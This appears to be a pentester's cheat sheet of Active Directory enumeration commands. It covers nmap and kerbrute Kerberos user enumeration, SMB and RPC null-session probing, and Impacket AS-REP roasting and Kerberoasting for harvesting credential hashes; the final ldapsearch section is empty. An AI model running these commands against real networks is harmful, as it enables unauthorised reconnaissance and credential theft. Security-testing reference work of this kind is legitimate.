### 1 - nmap

* ``` $ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=/root/Desktop/usernames.txt <IP> ``` 

### 2 - SMB

* enum shares with crackmapexec 
* ``` $ crackmapexec smb <IP> -u "guest" -p "" --shares ```

* valid user shares enum
* ``` $ crackmapexec smb <IP> -u "name" -p "pass" --shares ```

* enum shares with smbclient
* ``` $ smbclient -N -L //<IP>/ ```

* connect to shares
* ``` $ smbclient //<IP>/<SHARE> -U anonymous ``` 

* enum shares with smbmap 
* ``` $ smbmap -u null -p "" -H <IP> ```


### 3 - enum4linux

* ``` $ enum4linux -U -o <IP> (enum users and O.S) ```   

* ``` $ enum4linux -A <IP> (agressive mode) ```


### 4 - enum with rpcclient 

* empty user connection 
* ``` $ rpcclient <IP> -U "" -N ```

* valid user connection
* ``` $ rpcclient -U "name" <IP> ```


### 5 - metasploit

* ``` msf > use Auxiliary/gather/Kerberos_enumusers ```


### 6 - enum user with Kerbrute

* ``` $ ./kerbrute userenum --dc <IP>  -d ad.domain /path/to/wordlist ```


### 7 - Impacket scripts

#### If you have a list of valid users...
* [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) 
* ``` $ impacket-GetNPUsers -dc-ip <IP> <ad.domain/> -no-pass -usersfile <userslist> -format john ```


#### If you have valid creds...
* [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
* ``` $ impacket-GetUserSPN  -dc-ip <IP> <ad.domain>/<user>:<pass> -request ```


### 8 - ldapsearch

...
